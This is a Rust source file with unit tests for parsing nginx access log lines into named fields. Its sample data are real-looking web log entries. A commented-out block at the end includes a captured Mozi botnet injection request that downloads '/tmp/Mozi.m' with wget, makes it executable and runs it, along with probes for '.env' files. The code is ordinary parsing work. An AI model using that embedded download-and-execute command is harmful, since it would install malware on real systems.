use std::{collections::HashMap};
use nom::{bytes::complete::*, IResult, sequence::*, branch::alt, ToUsize};
use regex::Regex;

#[derive(Debug, PartialEq)] //allows {:?} to print the entire struct
pub struct LogFormat {
    fields: Vec<LogField>,
    seperator: String
}

#[derive(Debug, PartialEq)]
pub struct LogField {
    ordinal: u32,
    name: String,
    preceded_by: String,
    terminated_by: String
}

impl LogFormat {
    pub fn new(format: &str, seperator: &str) -> Self {
        let mut log_fields = Vec::new();
        let format_fields: Vec<&str> = format.split(seperator).collect();

        let mut i: u32 = 0;
        for field in format_fields {
            let mut preceded_by: String = "".to_string();
            let mut terminated_by: String = "".to_string();
            let name: String;
            
            //if the field is `missing` then give it generic name
            if field.contains("$") {
                let re = Regex::new(r#"\$([A-Za-z0-9-_]{1}+)"#).unwrap();
                let captures = re.captures(field).unwrap();
                name = format!("{}",&captures[1]);
                let var_name = &captures[0];
                let remainder = field.replace(var_name, "");
                if remainder.len() > 0 {
                    terminated_by = remainder.chars().last().unwrap().to_string();
                    preceded_by = remainder.chars().nth(0).unwrap().to_string();
                }
            } else {
                name = format!("field{}",i);
            }

            let log_field = LogField {
                ordinal: i,
                name: name,
                preceded_by: preceded_by,
                terminated_by: terminated_by
            };
            log_fields.push(log_field);

            i+=1;
        }

        LogFormat{
            fields: log_fields,
            seperator: seperator.to_string()
        }
    }
}

fn until_seperator<'a>(input: &'a str, seperator: &str) -> IResult<&'a str, &'a str> {
    alt(
        (take_until(seperator),take_until("\n"))
    )(input)
}

fn until_delimiter<'a>(input: &'a str, delimiter: &str) -> IResult<&'a str, &'a str> {
    take_until(delimiter)(input)
}

fn get_delimited<'a>(input: &'a str, preceded_by: &str, terminated_by: &str) -> IResult<&'a str, &'a str> {
    preceded(tag(preceded_by),take_until(terminated_by))(input)
}

pub fn parse(log_format: LogFormat, log_string: &str) -> HashMap<String, String> {
    let mut remainder = log_string;
    let seperator = log_format.seperator.as_str();
    let mut log_message = HashMap::new();
    let fields_len = log_format.fields.len();
    for log_field in log_format.fields {
        let mut preceded_by = log_field.preceded_by.as_str();
        let mut terminated_by = log_field.terminated_by.as_str();
        let ordinal = log_field.ordinal;
        let name = log_field.name.as_str();

        let field_value: &str;

        //if it not first and no other predessor, use space as predessor
        if ordinal.to_usize() != 0 && preceded_by == "" {
            preceded_by = seperator;
        }
        //if it not last and no other terminator, use space as terminator
        if ordinal.to_usize() != fields_len - 1 && terminated_by == "" {
            terminated_by = seperator;
        }

        (remainder, _) = until_delimiter(remainder, preceded_by).unwrap();
        (remainder, field_value) = get_delimited(remainder, preceded_by, terminated_by).unwrap();
        //if not last field, get to next space
        if ordinal.to_usize() != fields_len - 1 {
            (remainder, _) = until_seperator(remainder, log_format.seperator.as_str()).unwrap();
        }

        println!("value: {}",field_value);
         println!("remainder: {}",remainder);

        log_message.insert(name.to_string(), field_value.to_string());
    }
    log_message
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_new_log_format() {
        let log_format = r#"$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent""#;
        let format = LogFormat::new(log_format, " ");
        assert_eq!(format.fields.len(),9);
        assert_eq!(format.fields[1].name,"field1");
        assert_eq!(format.fields[7].name,"http_referer");
        assert_eq!(format.fields[3].terminated_by,"]");
        assert_eq!(format.fields[8].preceded_by,"\"");
    }

    #[test]
    fn test_until_space() {
        assert_eq!(until_seperator("135.125.244.48 -", " "),Ok((" -","135.125.244.48")));
        assert_eq!(until_seperator("135.125.244.48\n", " "),Ok(("\n","135.125.244.48")));
        assert_eq!(until_seperator(" 135.125.244.48 -", " "),Ok((" 135.125.244.48 -","")));
    }

    #[test]
    fn test_until_delimiter() {
        assert_eq!(
            until_delimiter(r#" "GET /.env HTTP/1.1" 404"#, r#"""#),
            Ok((r#""GET /.env HTTP/1.1" 404"#, " "))
        );
        assert_eq!(
            until_delimiter(r#" [15/Apr/2022:14:27:16 +0000]"#, r#"["#),
            Ok((r#"[15/Apr/2022:14:27:16 +0000]"#, " "))
        );
        assert_eq!(
            until_delimiter(r#"[15/Apr/2022:14:27:16 +0000]"#, r#"["#),
            Ok((r#"[15/Apr/2022:14:27:16 +0000]"#, ""))
        );
    }

    #[test]
    fn test_get_delimited() {
        assert_eq!(
            get_delimited(r#""GET /.env HTTP/1.1" 404"#, r#"""#, r#"""#),
            Ok(("\" 404", "GET /.env HTTP/1.1"))
        );
        assert_eq!(
            get_delimited(r#"[15/Apr/2022:14:27:16 +0000]"#, r#"["#, r#"]"#),
            Ok(("]", "15/Apr/2022:14:27:16 +0000"))
        );
        assert_eq!(
            get_delimited(r#"135.125.244.48 -"#, r#""#, r#" "#),
            Ok((r#" -"#, "135.125.244.48"))
        );
    }

    #[test]
    fn test_parse() {
        let format = r#"$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent""#;
        let log_format = LogFormat::new(format, " ");
        let log_string = r#"185.254.196.115 - - [15/Apr/2022:14:27:16 +0000] "GET /.env HTTP/1.1" 404 1371 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36""#;
        let log_message = parse(log_format, log_string);
        assert_eq!(log_message.len(),9);
        assert_eq!(log_message["remote_addr"],"185.254.196.115");
        assert_eq!(log_message["remote_user"],"-");
        assert_eq!(log_message["time_local"],"15/Apr/2022:14:27:16 +0000");
        assert_eq!(log_message["request"],"GET /.env HTTP/1.1");
        assert_eq!(log_message["status"],"404");
        assert_eq!(log_message["body_bytes_sent"],"1371");
        assert_eq!(log_message["http_referer"],"-");
        assert_eq!(log_message["http_user_agent"],"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36");
    }
}


// let multi_log_string = r#"
// 135.125.244.48 - - [15/Apr/2022:13:47:18 +0000] "GET /.env HTTP/1.1" 404 1371 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
// 185.82.218.64 - - [15/Apr/2022:13:53:42 +0000] "GET /.env HTTP/1.0" 404 3014 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36"
// 167.71.134.212 - - [15/Apr/2022:14:04:30 +0000] "\xE6T\xA1\x12)\x05\x1D\xF6\xED\xAD\x84M\x10\xF5\x9Cj\xE1\x87\xB2\xF6\xC2#\xAF}\x90\x8D\xB3M\xB0:\xB7\xF9W\xEA\xF0\xBDc\x07\xC8Z\xC9p\x83\x1A%\xDD\xC6\x5C\x81\x91\xFD\xBAX7u\xE3\x80\xE8\xFCd\x9C\x93l&\xF2bDBr" 400 172 "-" "-"
// 185.254.196.115 - - [15/Apr/2022:14:27:16 +0000] "GET /.env HTTP/1.1" 404 1371 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
// 185.254.196.115 - - [15/Apr/2022:14:27:17 +0000] "POST / HTTP/1.1" 404 1378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
// 220.123.14.232 - - [15/Apr/2022:14:39:32 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 172 "-" "-"
// 92.118.36.208 - - [15/Apr/2022:15:00:35 +0000] "GET / HTTP/1.1" 200 1609 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36"
// 212.115.42.251 - - [15/Apr/2022:15:12:01 +0000] "GET / HTTP/1.1" 200 1609 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"
// 135.125.244.48 - - [15/Apr/2022:15:15:34 +0000] "POST / HTTP/1.1" 404 1378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
// 135.125.244.48 - - [15/Apr/2022:15:15:35 +0000] "GET /.env HTTP/1.1" 404 1371 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36""#;
